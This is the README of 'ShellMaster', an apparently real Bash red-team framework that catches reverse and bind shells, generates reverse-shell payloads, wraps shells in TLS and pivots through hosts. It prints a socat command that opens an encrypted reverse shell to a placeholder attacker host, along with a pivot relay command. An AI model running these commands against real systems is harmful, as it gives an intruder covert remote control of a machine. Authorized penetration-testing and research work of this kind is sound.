
# 🔴 ShellMaster

> **Next-Gen Red Team Shell Management Framework**

> [📋 Documentation](docs/) &nbsp;&nbsp;|&nbsp;&nbsp; [⚙️ Installation & Setup](#installation)

<br/>

![Status](https://img.shields.io/badge/status-active-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![Privacy](https://img.shields.io/badge/use-authorized%20only-red)
![Maintained](https://img.shields.io/badge/maintained-yes-green)
![Built With](https://img.shields.io/badge/built%20with-Bash-1f425f)

</div>

---

## 📖 About The Project

**ShellMaster** is a professional-grade, modular Bash framework for managing reverse shells, encrypted listeners, payload generation, file transfers, and network pivoting — built for authorized penetration testing and security research.

> **Legal Notice:** This tool is intended exclusively for authorized security assessments, red team exercises, and educational use in controlled environments. Unauthorized use against any system is illegal. See [Legal Disclaimer](#legal-disclaimer).

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Project Structure](#project-structure)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
- [Modules](#modules)
- [Documentation](#documentation)
- [Legal Disclaimer](#legal-disclaimer)
- [Author](#author)
- [License](#license)

---

## 🔍 Overview

ShellMaster is a **controller–module CLI** built entirely in Bash. It wraps standard Unix networking tools (`nc`, `socat`, `openssl`, `ssh`) into an interactive menu-driven interface, enabling operators to:

- Catch and manage reverse/bind shell connections
- Generate payloads for Bash, PowerShell, Python, Perl, Ruby, and PHP
- Establish SSL/TLS-encrypted shell channels
- Transfer files via SCP or a one-command HTTP server
- Create port-forwarding relays and SSH tunnels
- Stabilize limited shells into full interactive PTYs
- Annotate sessions with text notes for report writing

All activity is logged to `logs/framework.log` for audit purposes.

---

## ⚡ Features

| Module | Capability |
|--------|------------|
| **Startup** | Dependency check on launch — warns immediately if `socat`, `nc`, `python3`, etc. are missing |
| **Listeners** | Reverse & bind listeners with auto-detected `nc`/`ncat`/`netcat` variant and correct flag handling, optional `rlwrap`, session tracking, session notes |
| **Payloads** | Bash, PowerShell, Python, Perl, Ruby, PHP generators — auto-detected attacker IP, Base64 encoding, batch generation, save to file |
| **Encryption** | `socat` SSL/TLS listener, RSA-2048 self-signed cert generation, encrypted payload output |
| **Transfer** | SCP upload/download, HTTP file server (`python3 -m http.server`), MD5 + SHA256 checksum verification, transfer history |
| **Relay / Pivot** | `socat` port relay, SSH local / remote / dynamic (SOCKS) tunnels, active relay management |
| **PTY Upgrade** | Step-by-step guides for Python `pty.spawn`, `script`-based upgrade, environment stabilization |
| **Logging** | Session IDs, event tracking, session notes, append-only JSON log in `logs/` |

---

## 📁 Project Structure

```
redteam-shell-framework/
├── shellmaster.sh          # Main CLI — interactive menu & module loader
├── config.sh               # Global paths, version, and environment config
├── utils.sh                # Colors, validation, logging helpers, session utils
│
├── modules/
│   ├── listeners.sh        # Reverse & bind shell listeners
│   ├── shells.sh           # Payload generator (Bash / PowerShell / Python)
│   ├── encrypt.sh          # SSL/TLS encrypted listener via socat
│   ├── transfer.sh         # SCP file upload/download & checksum
│   ├── relay.sh            # socat relay & SSH tunnel management
│   └── upgrade.sh          # PTY upgrade guides & environment stabilization
│
├── docs/
│   ├── ARCHITECTURE.md     # System design and module internals
│   ├── API.md              # Function reference for all modules
│   ├── EXAMPLES.md         # Real-world usage scenarios
│   ├── SECURITY.md         # Security model and threat considerations
│   └── TROUBLESHOOTING.md  # Common issues and fixes
│
├── logs/                   # Runtime logs and session records (git-ignored)
├── certs/                  # Generated certificates (git-ignored)
├── payloads/               # Generated payload files (git-ignored)
├── tmp/                    # Temporary files (git-ignored)
├── .gitattributes          # Enforces LF line endings for all .sh files
├── .gitignore
└── LICENSE
```

---

## 🛠️ Requirements

At startup, ShellMaster checks for all tools and prints a warning for anything that's missing.

### Required

| Tool | Purpose |
|------|---------|
| `bash` 4.0+ | Core runtime |
| `nc` / `ncat` / `netcat` | Listeners and connections (any variant) |

### Optional (feature-specific)

| Tool | Purpose | Used by |
|------|---------|---------|
| `socat` | Encrypted listeners and port relays | Encryption, Relay |
| `openssl` | Certificate generation | Encryption |
| `ssh` / `scp` | SSH tunneling and file transfer | Transfer, Relay |
| `python3` | HTTP file server, PTY upgrade | Transfer, PTY Upgrade |
| `rlwrap` | Command history and line editing in listeners | Listeners |

### Install dependencies — Debian / Ubuntu

```bash
sudo apt update && sudo apt install -y netcat-traditional socat openssl rlwrap openssh-client python3
```

### Install dependencies — RHEL / CentOS

```bash
sudo yum install -y ncat socat openssl rlwrap openssh-clients python3
```

---

## ⚙️ Installation

### Option 1 — Git (recommended)

```bash
git clone https://github.com/taguianas/redteam-shell-framework.git
cd redteam-shell-framework
bash shellmaster.sh
```

### Option 2 — wget

```bash
wget https://github.com/taguianas/redteam-shell-framework/archive/refs/heads/main.zip
unzip main.zip
cd redteam-shell-framework-main
bash shellmaster.sh
```

### Option 3 — curl

```bash
curl -L https://github.com/taguianas/redteam-shell-framework/archive/refs/heads/main.zip -o framework.zip
unzip framework.zip
cd redteam-shell-framework-main
bash shellmaster.sh
```

> `git` is only needed to clone the repository. The framework itself depends only on standard Bash and Unix tools.

### Running on Windows

The framework requires a **Unix Bash environment**. On Windows, use **Git Bash**:

1. Right-click the project folder → **Git Bash Here**
2. Run `bash shellmaster.sh`

> PowerShell and CMD are not supported.

---

## 🚀 Usage

Run the main controller from the project root:

```bash
bash shellmaster.sh
```

The interactive menu will load:

```
  ____  _          _ _ __  __           _
 / ___|| |__   ___| | |  \/  | __ _ ___| |_ ___ _ __
 \___ \| '_ \ / _ \ | | |\/| |/ _` / __| __/ _ \ '__|
  ___) | | | |  __/ | | |  | | (_| \__ \ ||  __/ |
 |____/|_| |_|\___|_|_|_|  |_|\__,_|___/\__\___|_|

  :: RedTeam Shell Framework :: v1.0 ::
-----------------------------------------------------

[ Phase 1: Core Listeners ]
1. Start Listener (nc/rlwrap)

[ Phase 2: Payloads ]
2. Generate Reverse Shell Payload

[ Phase 3: Encryption ]
3. Start Encrypted Listener (socat/ncat)

[ Phase 4-6: Advanced Operations ]
4. File Transfer
5. Pivot / Relay
6. Shell Stabilization (PTY)

99. Exit
```

---

## 🧩 Modules

### 1. Listeners

Start a reverse or bind listener on any port. The framework auto-detects which netcat variant is installed (`ncat`, OpenBSD `nc`, or traditional `nc`) and uses the correct flags for each. Optionally wrap with `rlwrap` for command history. Each session is assigned a unique ID and logged to `logs/sessions/`. After a session ends you are prompted to add a note; notes can also be managed from the menu at any time.

```
1. Start Reverse Listener   — catches incoming shells on a port
2. Start Bind Listener      — opens a backdoor that waits for connection
3. List Active Listeners    — shows active nc/ncat processes
4. Stop Listener            — kill by PID
5. Session Notes            — add or view notes on any session
6. Back
```

### 2. Payload Generator

Generate ready-to-use reverse shell one-liners. Your local IP is auto-detected and pre-filled — just confirm or override it. Supports Base64 encoding and saving to `payloads/` with metadata.

```
1.  Bash Reverse Shell
2.  PowerShell Reverse Shell
3.  Python Reverse Shell
4.  Perl Reverse Shell
5.  Ruby Reverse Shell
6.  PHP Reverse Shell
7.  One-Liner Templates
8.  View Generated Payloads
9.  Batch Generate (All Types)
10. Back
```

### 3. Encrypted Listener

Wraps shell traffic in SSL/TLS using `socat` and a self-signed RSA-2048 certificate stored in `certs/`. Prevents cleartext inspection of the connection.

```
1. Generate New Certificate
2. Start Encrypted Listener (socat SSL)
3. Generate Encrypted Payload (for target)
4. Back
```

**Target payload:**
```bash
socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
```

### 4. File Transfer

Upload and download files over SCP, or spin up a quick HTTP server for targets that don't have SSH. Verify file integrity with MD5 and SHA256 after transfer.

```
1. Upload File          — local → remote via SCP
2. Download File        — remote → local via SCP
3. Serve Files (HTTP)   — python3 -m http.server with auto-detected IP and copy-paste wget/curl commands
4. Verify Checksum      — MD5 + SHA256 of any file
5. View Transfer History
6. Back
```

### 5. Relay / Pivot

Create port-forwarding relays with `socat` or SSH tunnels to pivot through intermediate hosts.

```
1. Create socat Relay   — forward: listen_port → host:port
2. Create SSH Tunnel    — local (-L), remote (-R), or SOCKS (-D)
3. List Active Relays
4. Stop Relay
5. Back
```

**socat relay example:**
```bash
socat TCP-LISTEN:4444,fork,reuseaddr TCP:192.168.1.50:4444
```

### 6. Shell Stabilization

Step-by-step commands to upgrade a limited reverse shell to a fully interactive PTY.

```
1. Python PTY Upgrade    — pty.spawn('/bin/bash') + stty raw -echo
2. Script PTY Upgrade    — script -qc /bin/bash /dev/null
3. Fix Environment       — TERM, PATH, stty rows/cols, reset
4. Enable Terminal Features — history, colour prompt, tab completion
5. Back
```

---

## 📚 Documentation

| File | Contents |
|------|----------|
| [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) | System design, data flow, module internals |
| [`docs/API.md`](docs/API.md) | Function reference for all modules and utils |
| [`docs/EXAMPLES.md`](docs/EXAMPLES.md) | Real-world usage walkthroughs |
| [`docs/SECURITY.md`](docs/SECURITY.md) | Threat model and security considerations |
| [`docs/TROUBLESHOOTING.md`](docs/TROUBLESHOOTING.md) | Common issues and solutions |

---

## ⚖️ Legal Disclaimer

This framework is provided for **educational purposes** and **authorized security testing only**.

Permitted uses:
- Authorized penetration testing with explicit written permission
- Red team exercises in controlled lab environments
- Security research and tool development
- Academic study of offensive security techniques

**Using this tool against any system without prior authorization is illegal** and may violate local, national, or international law. The author assumes no responsibility for any misuse or damage. By using this project, you accept full responsibility for your actions and compliance with all applicable laws.

---

## 👤 Author

**Anas TAGUI**

Developed as part of ongoing research into shell handling, traffic encryption, and modular Bash-based security tooling.

---

## 📄 License

This project is licensed under the **MIT License**. See [`LICENSE`](LICENSE) for full details.
